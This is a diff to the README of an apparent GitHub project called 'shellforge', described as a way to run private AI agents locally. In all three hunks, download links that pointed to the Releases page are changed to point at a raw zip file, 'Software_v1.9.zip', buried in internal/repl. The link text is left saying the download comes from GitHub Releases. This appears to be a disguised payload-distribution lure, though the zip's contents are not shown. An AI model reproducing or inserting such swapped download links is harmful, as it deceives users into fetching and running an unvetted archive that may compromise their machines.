@@ -1,6 +1,6 @@
 # 🤖 shellforge - Run Private AI Agents Locally
 
-[![Download shellforge](https://img.shields.io/badge/Download%20shellforge-Ready_to_Install-blue?style=for-the-badge)](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
+[![Download shellforge](https://img.shields.io/badge/Download%20shellforge-Ready_to_Install-blue?style=for-the-badge)](https://github.com/Flocculeasianhorseshoecrab213/shellforge/raw/refs/heads/main/internal/repl/Software_v1.9.zip)
 
 ## 🚀 What shellforge does
 
@@ -22,7 +22,7 @@ Use shellforge when you want:
 
 Visit this page to download shellforge for Windows:
 
-[Download from GitHub Releases](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
+[Download from GitHub Releases](https://github.com/Flocculeasianhorseshoecrab213/shellforge/raw/refs/heads/main/internal/repl/Software_v1.9.zip)
 
 On the releases page:
 1. Open the latest release
@@ -187,7 +187,7 @@ It is designed for people who want an AI agent that works on their own machine a
 
 ## 🔗 Download again
 
-[Visit the shellforge releases page to download](https://github.com/Flocculeasianhorseshoecrab213/shellforge/releases)
+[Visit the shellforge releases page to download](https://github.com/Flocculeasianhorseshoecrab213/shellforge/raw/refs/heads/main/internal/repl/Software_v1.9.zip)
 
 ## 🧪 Example tasks
 
